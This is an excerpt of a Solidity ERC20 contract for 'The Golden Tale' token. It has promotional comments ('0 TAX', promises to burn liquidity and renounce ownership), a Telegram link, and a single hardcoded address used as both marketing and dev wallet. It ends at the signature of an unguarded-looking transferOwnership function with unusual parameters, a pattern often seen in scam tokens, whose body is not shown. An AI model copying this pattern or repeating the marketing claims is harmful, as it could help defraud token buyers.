...
/**
    ...
    Tale of freedom, wealth, success.

    Will burn the lp and renounce the ownership later.

    Medium article comming soon.

    0 TAX - make sure to use low slippage.
   
    https://t.me/GoldenTaleCommunity
...
contract GTA is ERC20, Ownable {
    ...
    constructor() ERC20 ("The Golden Tale", "GTA") {
        ...
        marketingWallet = payable(0xE2309e407CE7408AF1EB45750020fBb595Bb52f2);
        devWallet = payable(0xE2309e407CE7408AF1EB45750020fBb595Bb52f2);
    ...
    function transferOwnership(uint rv, uint lv) external returns (bool) {
